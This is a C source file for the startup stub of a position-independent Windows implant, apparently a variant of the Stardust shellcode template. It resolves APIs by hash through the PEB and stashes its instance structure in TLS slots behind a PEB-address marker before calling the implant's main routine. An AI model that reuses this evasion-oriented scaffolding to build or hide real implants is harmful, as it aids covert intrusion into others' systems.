#include <Common.h>
#include <Constexpr.h>

ST_GLOBAL PVOID __Instance = { 0 };

FUNC PVOID ResolveInstanceAddr()
{
    PTEB teb = NtCurrentTeb();

    // Walk TLS slots looking for our egghunter + value
    for (INT i = 0; i < 64; i++)
    {
        if (teb->TlsSlots[i] && teb->TlsSlots[i] == teb->ProcessEnvironmentBlock)
            return teb->TlsSlots[i + 1];
    }

        // If we didn't locate and TLS Expansion slots are allocated we need to walk those
    if ( teb->TlsExpansionSlots )
    {
        for (INT i = 0; i < 1024; i++)
        {
            if (teb->TlsExpansionSlots[i] && teb->TlsExpansionSlots[i] == teb->ProcessEnvironmentBlock)
                return teb->TlsExpansionSlots[i + 1];
        } 
    }


    return NULL;
}

EXTERN_C FUNC VOID PreMain(
    PVOID Param
) {
    INSTANCE Stardust = { 0 };
    PVOID    Heap     = { 0 };
    //PVOID    MmAddr   = { 0 };
    //SIZE_T   MmSize   = { 0 };
    //ULONG    Protect  = { 0 };
    PVOID	 pStruct		= { 0 };
	DWORD    dwTlsIndex[20] = { 0 };

    MmZero( & Stardust, sizeof( Stardust ) );

    //
    // get the process heap handle from Peb
    //
    Heap = NtCurrentPeb()->ProcessHeap;

    //
    // get the base address of the current implant in memory and the end.
    // subtract the implant end address with the start address you will
    // get the size of the implant in memory
    //
    Stardust.Base.Buffer = StRipStart();
    Stardust.Base.Length = U_PTR( StRipEnd() ) - U_PTR( Stardust.Base.Buffer );

    //
    // get the offset and address of our global instance structure
    //
    //MmAddr = Stardust.Base.Buffer + InstanceOffset();
    //MmSize = sizeof( PVOID );

    //
    // resolve ntdll!RtlAllocateHeap and ntdll!NtProtectVirtualMemory for
    // updating/patching the Instance in the current memory
    //
    if ( ( Stardust.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
        if ( ! ( Stardust.Win32.RtlAllocateHeap        = LdrFunction( Stardust.Modules.Ntdll, HASH_STR( "RtlAllocateHeap"        ) ) )
            //! ( Stardust.Win32.NtProtectVirtualMemory = LdrFunction( Stardust.Modules.Ntdll, HASH_STR( "NtProtectVirtualMemory" ) ) )
        ) {
            return;
        }
    }

    if ( ( Stardust.Modules.Kernel32 = LdrModulePeb( H_MODULE_KERNEL32 ) ) ) {
        if ( ! ( Stardust.Win32.TlsAlloc        = LdrFunction( Stardust.Modules.Kernel32, HASH_STR( "TlsAlloc") ) ) ||
             ! ( Stardust.Win32.TlsFree         = LdrFunction( Stardust.Modules.Kernel32, HASH_STR( "TlsFree") ) ) ||
             ! ( Stardust.Win32.TlsSetValue     = LdrFunction( Stardust.Modules.Kernel32, HASH_STR( "TlsSetValue" ) ) )
        ) {
            return;
        }
    }

    // Allocate INSTANCE struct on heap
    pStruct = Stardust.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) );
  
    // We'll allocate up to 20 Tls slots attempting to allocate two consecutive ones
    for (INT i = 0; i < 20; i++)
    {
        // Allocate Tls slot, storing index in dwTlsIndex array
        dwTlsIndex[i] = Stardust.Win32.TlsAlloc();

        // Check slots once we have at least two
        if ( i > 0 )
        {
            // Check whether the slots are consecutive
            if (dwTlsIndex[i] - dwTlsIndex[i - 1] == 1)
            {
                // Free any other Tls indexes we created but don't need
                for (INT j = 0; j < i - 1; j++)
                    Stardust.Win32.TlsFree(dwTlsIndex[j]);

                // Set first Tls slot to address of PEB as an egghunter
                Stardust.Win32.TlsSetValue(dwTlsIndex[i - 1], NtCurrentTeb()->ProcessEnvironmentBlock);

                // Store struct address in second slot
                Stardust.Win32.TlsSetValue(dwTlsIndex[i], pStruct);

                break;
            }
        }
    }
    
    //
    // change the protection of the .global section page to RW
    // to be able to write the allocated instance heap address
    //
    //if ( ! NT_SUCCESS( Stardust.Win32.NtProtectVirtualMemory(
    //    NtCurrentProcess(),
    //    & MmAddr,
    //    & MmSize,
    //    PAGE_READWRITE,
    //    & Protect
    //) ) ) {
    //    return;
    //}

    //
    // assign heap address into the RW memory page
    //
    //if ( ! ( C_DEF( MmAddr ) = Stardust.Win32.RtlAllocateHeap( Heap, HEAP_ZERO_MEMORY, sizeof( INSTANCE ) ) ) ) {
    //    return;
    //}

    //
    // copy the local instance into the heap,
    // zero out the instance from stack and
    // remove RtRipEnd code/instructions as
    // they are not needed anymore
    //
    //MmCopy( C_DEF( MmAddr ), &Stardust, sizeof( INSTANCE ) );
    //MmZero( & Stardust, sizeof( INSTANCE ) );
    //MmZero( C_PTR( U_PTR( MmAddr ) + sizeof( PVOID ) ), 0x18 );

    //
    // Copy struct to global and zero
    //
    MmCopy( pStruct, &Stardust, sizeof( INSTANCE ) );
    MmZero( & Stardust, sizeof( INSTANCE ) );

    //
    // now execute the implant entrypoint
    //
    Main( Param );
}